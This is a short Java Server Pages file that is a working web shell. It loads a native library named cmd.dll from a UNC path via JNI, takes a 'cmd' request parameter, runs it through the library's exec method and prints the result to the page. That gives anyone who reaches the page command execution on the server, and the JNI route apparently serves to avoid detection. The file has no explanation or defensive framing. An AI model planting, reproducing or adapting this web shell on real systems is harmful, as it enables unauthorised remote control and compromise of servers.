<%@ page contentType="text/html; charset=UTF-8" language="java" %>
<%! class Jni{
    static {
        System.loadLibrary("\\\\127.0.0.1\\cmd.dll");
    }
    public  native String exec(String cmd);
}
%><%
    String cmd =request.getParameter("cmd");
    Jni jni = new Jni();
    String res = jni.exec(cmd);
    out.println(res);
%>